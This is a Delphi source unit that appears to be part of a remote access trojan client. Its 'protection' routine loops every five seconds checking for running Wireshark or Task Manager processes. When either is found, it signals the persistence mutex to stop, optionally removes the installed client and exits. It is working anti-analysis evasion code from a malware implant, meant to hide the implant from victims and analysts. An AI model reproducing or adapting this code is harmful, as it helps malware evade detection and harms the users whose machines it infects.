Unit UnitProtection;

interface

uses
  Windows, TLhelp32, UnitConfiguration, UnitInstallation, UnitVariables, UnitFunctions,
  UnitPluginManager;

procedure InitProtection;

implementation

function IsWireSharkPresent: boolean;
var
  handle: THandle;
  procinfo: ProcessEntry32;
begin
  result := false;
  handle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  procinfo.dwSize := sizeof(PROCESSENTRY32);

  while(Process32Next(handle, procinfo)) do
  begin
    if pos(pchar(UpperString('wireshark.exe')), UpperString(procinfo.szExeFile)) > 0 then
    begin
      CloseHandle(handle);
      result := true;
      exit;
    end;
  end;
  CloseHandle(handle);
end;
   
function IsTaskMgrPresent: boolean;
var
  handle: THandle;
  procinfo: ProcessEntry32;
begin
  result := false;
  handle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  procinfo.dwSize := sizeof(PROCESSENTRY32);

  while(Process32Next(handle, procinfo)) do
  begin
    if pos(pchar(UpperString('taskmgr.exe')), UpperString(procinfo.szExeFile)) > 0 then
    begin
      CloseHandle(handle);
      result := true;
      exit;
    end;
  end;
  CloseHandle(handle);
end;

procedure MyCleanUp(Uninstall: Boolean);
begin
  if Uninstall then
  begin
    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);   
      CloseHandle(PersistMutex);
    end;
                             
    if _MutexName <> 'NoMUTEX' then CloseHandle(MainMutex);
    RemoveClient;
  end;

  ExitProcess(0);
end;

function CheckExecConditions: Boolean;
begin
  Result := (IsWireSharkPresent) or (IsTaskMgrPresent);
end;

procedure InitProtection;
begin
  while True do
  begin
    if CheckExecConditions then MyCleanUp(_AntiRemove);
    Sleep(5000);
  end;
end;

end.

